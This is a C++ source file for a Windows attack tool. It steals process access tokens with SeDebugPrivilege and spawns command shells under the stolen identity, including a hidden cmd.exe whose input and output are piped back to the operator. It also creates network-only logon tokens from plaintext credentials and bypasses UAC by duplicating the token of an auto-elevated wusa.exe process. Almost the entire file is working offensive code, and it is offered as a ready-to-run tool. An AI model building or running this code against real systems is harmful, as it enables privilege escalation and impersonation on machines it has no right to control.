#include <stdio.h>
#include <iostream>
#include <string>
#include <tchar.h>
#include <Shlobj.h>
#include <atlstr.h>
#include <Windows.h>
#include <process.h>
#include <strsafe.h>
#include <boost/program_options.hpp>
#include "DebugPrivilege.h"

#define MAX_NAME 256
#define BUFSIZE 4096 

namespace po = boost::program_options;

void contextCheck();
LPWSTR stringToLPWSTR(const std::string&);
HANDLE stealToken(DWORD);
void spawn(DWORD);
void spawn(DWORD, LPCWSTR, LPWSTR);
void maketoken(LPWSTR, LPWSTR, LPWSTR);
void redirectChildToParent(DWORD pid);
void bypassUAC();


int main(int argc, char* argv[]) {
	//Manage the command line arguments
	//First set the arguments and their descriptions
	po::options_description general_desc("General options");
	po::options_description impersonate_desc("Impersonation Options");
	po::options_description exec_desc("Execution Options");
	po::options_description exec_literal("");
	po::options_description maketoken_desc("Make Token Options");
	po::options_description uacbypass_desc("UAC Bypass Options");
	//General menu options
	general_desc.add_options() ("help", "Display help menu.");
	//Spawn menu options
	impersonate_desc.add_options()
		("impersonate", "Impersonates the specified pid and spawns a new child process under its context.")
		("pid", po::value<DWORD>(), "Proccess ID to steal the token from.")
		("spawn", "Spawns a new command prompt under the context of the stolen token.")
		;
	//Exec menu options
	exec_desc.add_options()
		("exec", "Execute an instance of a specified program under the impersonated context.")
		("pid", po::value<DWORD>(), "Proccess ID to steal the token from.")
		("prog", "The full path to the program to be executed.")
		("args", "Optional execution arguments for the specified program.")
		;
	exec_literal.add_options()
		("exec", "Execute an instance of a specified program.")
		("prog", po::value <std::string>(), "The full path to the program to be executed.")
		("args", po::value<std::string>(), "Optional execution arguments for the specified program.")
		;
	//Maketoken menu options
	maketoken_desc.add_options()
		("maketoken", "Create a new process under a set of creds for only network authentication (Similar to runas /netonly).")
		("username", po::value <std::string>(), "Username")
		("password", po::value <std::string>(), "Password in plaintext format.")
		("domain", po::value <std::string>(), "The domain the user belongs, if domain isn't specified the local machine will be used.")
		;
	//UAC Bypass Menu
	uacbypass_desc.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
	//Next we will merge them for the help menu
	// Declare an options description instance which will include
	// all the options
	po::options_description all("Usage");
	all.add(general_desc).add(impersonate_desc).add(exec_desc).add(maketoken_desc).add(uacbypass_desc);
	//Make another options list to store the same settings but without the duplicate pid argument
	po::options_description all_literal("");
	all_literal.add(general_desc).add(impersonate_desc).add(exec_literal).add(maketoken_desc).add(uacbypass_desc);
	//Next lets create a map for the arguments
	po::variables_map vm;
	po::store(parse_command_line(argc, argv, all_literal), vm);
	//Now lets map their functionality
	//Help menu
	if (vm.count("help") || vm.empty()) {
		std::cout << all << std::endl;
		ExitProcess(1);
		//Impersonation menu
	} else if (vm.count("impersonate") && vm.count("pid") && vm.count("spawn")) {
		contextCheck();
		spawn(vm["pid"].as<DWORD>());
	} else if (vm.count("impersonate") && vm.count("pid")) {
		contextCheck();
		redirectChildToParent(vm["pid"].as<DWORD>());
	} else if (vm.count("impersonate")) {
		std::cout << impersonate_desc << std::endl;
		ExitProcess(1);
		//Execution menu
	} else if (vm.count("exec") && vm.count("pid") && vm.count("prog") && vm.count("args")) {
		contextCheck();
		LPCWSTR program = stringToLPWSTR(vm["prog"].as<std::string>());
		LPWSTR arguments = stringToLPWSTR(vm["args"].as<std::string>());
		spawn(vm["pid"].as<DWORD>(), program, arguments);
	} else if (vm.count("exec") && vm.count("pid") && vm.count("prog")) {
		contextCheck();
		LPCWSTR program = stringToLPWSTR(vm["prog"].as<std::string>());
		spawn(vm["pid"].as<DWORD>(), program, NULL);
	} else if (vm.count("exec")) {
		std::cout << exec_desc << std::endl;
		ExitProcess(1);
		//Make Token menu
	} else if (vm.count("maketoken") && vm.count("username") && vm.count("password") && vm.count("domain")) {
		LPWSTR username = stringToLPWSTR(vm["username"].as<std::string>());
		LPWSTR password = stringToLPWSTR(vm["password"].as<std::string>());
		LPWSTR domain = stringToLPWSTR(vm["domain"].as<std::string>());
		maketoken(username, password, domain);
	} else if (vm.count("maketoken") && vm.count("username") && vm.count("password")) {
		LPWSTR username = stringToLPWSTR(vm["username"].as<std::string>());
		LPWSTR password = stringToLPWSTR(vm["password"].as<std::string>());
		maketoken(username, password, (LPWSTR)".");
	} else if (vm.count("maketoken") && vm.count("username") || vm.count("maketoken") && vm.count("password")) {
		printf("[-]You need to specify both username and password!\n");
		ExitProcess(1);
	} else if (vm.count("maketoken")) {
		std::cout << maketoken_desc << std::endl;
		ExitProcess(1);
	} else if (vm.count("pwnuac")) {
		bypassUAC();
	} else {
		printf("[-]Unknown Command\n");
		ExitProcess(1);
	}
}

//Checks for Admin privileges and tries to enable SeDebugPrivilege
void contextCheck() {
	if (IsUserAnAdmin()) {
		printf("[+]Elevated Context Found\n");
	} else {
		printf("[-]Run this program in an elevated context\n");
		ExitProcess(-1);
	}
	printf("[*]Enabling SeDebugPrivilege\n");
	//Lets enable the SeDebugPrivilege
	if (!EnableDebugPrivilege()) {
		printf("[-]Couldn't enable SeDebugPrivilege\nExiting...\n");
		ExitProcess(-1);
	} else {
		printf("[+]SeDebugPrivilege ENABLED\n");
	}
}

//THis function transforms a c++ string to LPWSTR c_str
LPWSTR stringToLPWSTR(const std::string& instr) {
	// Assumes std::string is encoded in the current Windows ANSI codepage
	int bufferlen = MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0);

	if (bufferlen == 0) {
		// Something went wrong. Perhaps, check GetLastError() and log.
		return 0;
	}

	// Allocate new LPWSTR - must deallocate it later
	LPWSTR widestr = new WCHAR[bufferlen + 1];

	MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), widestr, bufferlen);

	// Ensure wide string is null terminated
	widestr[bufferlen] = 0;
	return widestr;
}

//This function holds the main functionality for token stealing and returns a handle to the token
HANDLE stealToken(DWORD pid) {
	//Lets open the process of the specified PID
	printf("[+]Target PID: %d\n", pid);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
	if (hProcess == NULL) {
		printf("OpenProcess() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]OpenProcess() succeed!\n");
	//Next we need to open a handle to the Access Token of the process
	HANDLE hToken;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
		printf("OpenProcessToken() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]OpenProcessToken() succeed!\n");
	//Next lets duplicate the token of the specified process
	HANDLE hTokenDuplicate;
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDuplicate)) {
		printf("DuplicateTokenEx() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]DuplicateTokenEx() succeed!\n");
	CloseHandle(hToken);
	CloseHandle(hProcess);
	return hTokenDuplicate;
}

//Spawn a new cmd.exe process under the context of a stolen token
void spawn(DWORD pid) {
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	//Zeroing out memory for the two structures that will hold our new process info
	SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	//Setting the size of the info structure
	startupInfo.cb = sizeof(STARTUPINFO);
	//Now lest get a handle to the token of the pid we specified
	HANDLE hTokenDuplicate = stealToken(pid);
	//Last thing we will create a new process using the duplicated token
	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation) == 0) {
		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]CreateProcessWithTokenW() succeed!\n");
	printf("[+]Proccess spawned\n");
	CloseHandle(hTokenDuplicate);
}

//Overloaded version of spawn with custom program and arguments
void spawn(DWORD pid, LPCWSTR prog, LPWSTR args) {
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	//Zeroing out memory for the two structures that will hold our new process info
	SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	//Setting the size of the info structure
	startupInfo.cb = sizeof(STARTUPINFO);
	//Now lest get a handle to the token of the pid we specified
	HANDLE hTokenDuplicate = stealToken(pid);
	//Last thing we will create a new process using the duplicated token
	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, prog, args, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]CreateProcessWithTokenW() succeed!\n");
	printf("[+]Proccess spawned\n");
	CloseHandle(hTokenDuplicate);
}

//Spawn a child process in another context without spawning a new cmd window and use two named pipes to talk to the child process
void redirectChildToParent(DWORD pid) {
	BOOL bSuccess;
	//Create two handles to our INPUT and OUTPUT
	HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
	//Create handles for our inpout and output read/write operations of the child process
	HANDLE childInRead = NULL;
	HANDLE childInWrite = NULL;
	HANDLE childOutRead = NULL;
	HANDLE childOutWrite = NULL;
	//Next we set the security attributes
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	//Create a pipe for the child process's STDOUT
	if (!CreatePipe(&childOutRead, &childOutWrite, &saAttr, 0)) {
		printf("CreatePipe() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Ensure the read handle to the pipe for STDOUT is not inherited.
	if (!SetHandleInformation(childOutRead, HANDLE_FLAG_INHERIT, 0)) {
		printf("SetHandleInformation() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Create a pipe for the child process's STDIN
	if (!CreatePipe(&childInRead, &childInWrite, &saAttr, 0)) {
		printf("CreatePipe() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Ensure the write handle to the pipe for STDIN is not inherited.
	if (!SetHandleInformation(childInWrite, HANDLE_FLAG_INHERIT, 0)) {
		printf("SetHandleInformation() error : % u\n", GetLastError());
		ExitProcess(-1);
	}

	//Next lets create and configure the structures the new process needs
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	//Zeroing out memory for the two structures that will hold our new process info
	SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	//Setting the proper values of the STARTUPINFO structure
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput = childInRead;
	startupInfo.hStdOutput = childOutWrite;
	//Now lest get a handle to the token of the pid we specified
	HANDLE hTokenDuplicate = stealToken(pid);
	//Last thing we will create a new process using the duplicated token
	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]CreateProcessWithTokenW() succeed!\n");
	printf("[+]Proccess spawned\n");
	//Closing all the handles after we are done
	CloseHandle(hTokenDuplicate);
	CloseHandle(childInRead);
	CloseHandle(childOutWrite);
	//Create a buffer and try to read and write on the pipes
	CHAR chBuf[BUFSIZE];
	DWORD dwRead, dwWritten;
	//Last this we set a loop to read and write to the pipe of the child process
	while (1) {
		//Read once from the pipe
		bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
		if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
			break;
		} // child process exit.
		bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
		//Check if we have leftover data using PeekNamedPipe and another loop
		while (1) {
			DWORD bytesAvail = 0;
			if (!PeekNamedPipe(childOutRead, NULL, BUFSIZE, NULL, &bytesAvail, NULL)) {
				printf("PeekNamedPipe() error : % u\n", GetLastError());
				ExitProcess(-1);
			}
			if (bytesAvail) {
				//Read from pipe
				bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
				if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
					break;
				} // child process exit.
				bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
			} else {
				break;
			}
		}
		//Write to pipe
		bSuccess = ReadFile(hStdin, chBuf, BUFSIZE, &dwRead, NULL);
		bSuccess = WriteFile(childInWrite, chBuf, dwRead, &dwWritten, NULL);
		//A small sleep to give time to the write operation to execute before we try to read from the pipe again
		Sleep(100);
	}
	WaitForSingleObject(processInformation.hProcess, INFINITE);
	LocalFree(chBuf);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	ExitProcess(1);
}

//Makes a new token and spawns a new child process under its context, the specified creds work for network authentication only
void maketoken(LPWSTR username, LPWSTR password, LPWSTR domain) {
	BOOL bSuccess;
	//Create two handles to our INPUT and OUTPUT
	HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
	//Create handles for our inpout and output read/write operations of the child process
	HANDLE childInRead = NULL;
	HANDLE childInWrite = NULL;
	HANDLE childOutRead = NULL;
	HANDLE childOutWrite = NULL;
	//Next we set the security attributes
	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	//Create a pipe for the child process's STDOUT
	if (!CreatePipe(&childOutRead, &childOutWrite, &saAttr, 0)) {
		printf("CreatePipe() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Ensure the read handle to the pipe for STDOUT is not inherited.
	if (!SetHandleInformation(childOutRead, HANDLE_FLAG_INHERIT, 0)) {
		printf("SetHandleInformation() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Create a pipe for the child process's STDIN
	if (!CreatePipe(&childInRead, &childInWrite, &saAttr, 0)) {
		printf("CreatePipe() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Ensure the write handle to the pipe for STDIN is not inherited.
	if (!SetHandleInformation(childInWrite, HANDLE_FLAG_INHERIT, 0)) {
		printf("SetHandleInformation() error : % u\n", GetLastError());
		ExitProcess(-1);
	}

	//Next lets create and configure the structures the new process needs
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	//Zeroing out memory for the two structures that will hold our new process info
	SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	//Setting the proper values of the STARTUPINFO structure
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput = childInRead;
	startupInfo.hStdOutput = childOutWrite;
	_tprintf(_T("[*]Spawning Process as user: %s\\%s\n"), domain, username);
	//First lets log user on the local computer with the set of creds
	if (!CreateProcessWithLogonW(username, domain, password, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation)) {
		printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]Proccess spawned\n");
	CloseHandle(childInRead);
	CloseHandle(childOutWrite);
	//Create a buffer and try to read and write on the pipes
	CHAR chBuf[BUFSIZE];
	DWORD dwRead, dwWritten;
	//Last this we set a loop to read and write to the pipe of the child process
	while (1) {
		//Read once from the pipe
		bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
		if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
			break;
		} // child process exit.
		bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
		//Check if we have leftover data using PeekNamedPipe and another loop
		while (1) {
			DWORD bytesAvail = 0;
			if (!PeekNamedPipe(childOutRead, NULL, BUFSIZE, NULL, &bytesAvail, NULL)) {
				printf("PeekNamedPipe() error : % u\n", GetLastError());
				ExitProcess(-1);
			}
			if (bytesAvail) {
				//Read from pipe
				bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
				if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
					break;
				} // child process exit.
				bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
			}
			else {
				break;
			}
		}
		//Write to pipe
		bSuccess = ReadFile(hStdin, chBuf, BUFSIZE, &dwRead, NULL);
		bSuccess = WriteFile(childInWrite, chBuf, dwRead, &dwWritten, NULL);
		//A small sleep to give time to the write operation to execute before we try to read from the pipe again
		Sleep(100);
	}
	WaitForSingleObject(processInformation.hProcess, INFINITE);
	LocalFree(chBuf);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	ExitProcess(1);
}

//This function tries to bypass UAC by using the token-duplication method
void bypassUAC() {
	if (IsUserAnAdmin()) {
		printf("[*]Already in elevated context!\n");
		ExitProcess(1);
	}
	//Lets spawn an autoelevated application like wusa.exe or taskmgr.exe
	//Initialize the structures for the process creation
	SID_IDENTIFIER_AUTHORITY sSIA = SECURITY_MANDATORY_LABEL_AUTHORITY;
	SID_AND_ATTRIBUTES sSAA;
	TOKEN_MANDATORY_LABEL sTML;
	HANDLE pSID;
	SHELLEXECUTEINFO eWusa;
	SecureZeroMemory(&eWusa, sizeof(SHELLEXECUTEINFO));
	eWusa.cbSize = sizeof(eWusa);
	eWusa.fMask = 0x40;
	eWusa.lpFile = L"wusa.exe";
	eWusa.nShow = SW_HIDE;
	//Now lets create the process
	printf("[*]Spawning an instance of an autoelevated process\n");
	if (!ShellExecuteEx(&eWusa)) {
		printf("ShellExecuteEx() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]Process Spawned\n");
	//Now lets open a handle to the token
	HANDLE hToken;
	if (!OpenProcessToken(eWusa.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
		printf("OpenProcessToken() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]OpenProcessToken() success!\n");
	//Now lets duplicate the token
	HANDLE hTokenDuplicate;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDuplicate)) {
		printf("hTokenDuplicate() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]DuplicateTokenEx() succeed!\n");
	//Next we need to downgrade the token into medium integrity level, also remove critical sids and privileges
	//First we initialize the Sid
	printf("[*]Creating new restricted SID\n");
	if (!AllocateAndInitializeSid(&sSIA, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSID)) {
		printf("AllocateAndInitializeSid() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Next we prepare the structure TOKEN_MANDATORY_LABEL to set the medium integrity of the token
	sSAA.Sid = pSID;
	sSAA.Attributes = SE_GROUP_INTEGRITY;
	sTML.Label = sSAA;
	printf("[*]Applying the restricted SID to the duplicated token\n");
	//Next we will call SetTokenInformation to downgrade the Integrity of the token
	if (SetTokenInformation(hTokenDuplicate, TokenIntegrityLevel, &sTML, sizeof(TOKEN_MANDATORY_LABEL)) == 0) {
		printf("SetTokenInformation() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Now i need to create the restricted token
	HANDLE hTokenRestricted;
	printf("[*]Attemping to create a restricted token\n");
	//The LUA_TOKEN spesification means the token is for Limited/Least-Privilege User Account
	if (CreateRestrictedToken(hTokenDuplicate, LUA_TOKEN, 0, NULL, 0, NULL, 0, NULL, &hTokenRestricted) == 0) {
		printf("CreateRestrictedToken() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]Restricted token created!\n");
	HANDLE hTokenRestrictedDuplicate;
	//Now lets duplicate the restricted token and make it available for impersonation
	if (!DuplicateTokenEx(hTokenRestricted, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hTokenRestrictedDuplicate)) {
		printf("DuplicateTokenEx() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]DuplicateTokenEx() succeed!\n");
	//Now will impersonate the new token
	if (!ImpersonateLoggedOnUser(hTokenRestrictedDuplicate)) {
		printf("ImpersonateLoggedOnUser() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]ImpersonateLoggedOnUser() succeed!\n");
	//Now lets spawn a command prompt using the new Impersonated context
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	printf("[*]Spawning new elevated process\n");
	//Now lest create a process under the new elevated context
	if (!CreateProcessWithLogonW(L"pwned", L"by", L"sickboy", LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
		printf("[-]Target isn't vulnerable!\n");
		ExitProcess(-1);
	}
	printf("[+]Process spawned!\n");
	//Closing handles
	CloseHandle(hToken);
	CloseHandle(hTokenDuplicate);
	CloseHandle(hTokenRestricted);
	CloseHandle(hTokenRestrictedDuplicate);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
